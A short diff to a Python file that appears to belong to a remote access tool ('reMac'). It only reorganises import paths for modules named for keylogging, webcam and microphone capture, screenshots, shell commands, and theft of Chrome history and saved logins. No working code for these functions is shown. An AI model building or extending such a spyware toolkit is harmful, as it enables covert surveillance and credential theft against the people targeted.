@@ -3,17 +3,14 @@
 # __license__ = "GPLv3"
 
 import sys
-from modules import mod_hello
-from modules import mod_clipboard
-from modules import mod_chrome_history
-from modules import mod_chrome_logins
-from modules import mod_shellcmd
-from modules import mod_screenshot
-from modules import mod_webcam
-from modules import mod_keylogger
-from modules import mod_recmic
-from modules import mod_modHelp
-from modules import mod_info
+from apps.server.modules import mod_clipboard, mod_keylogger, mod_hello, mod_chrome_logins
+from apps.server.modules import mod_chrome_history
+from apps.server.modules import mod_shellcmd
+from apps.server.modules import mod_screenshot
+from apps.server.modules import mod_webcam
+from apps.server.modules import mod_recmic
+from apps.server.modules import mod_modHelp
+from apps.server.modules import mod_info
 
 from apps.libs.reMac_libbase import reMac_libbase
 
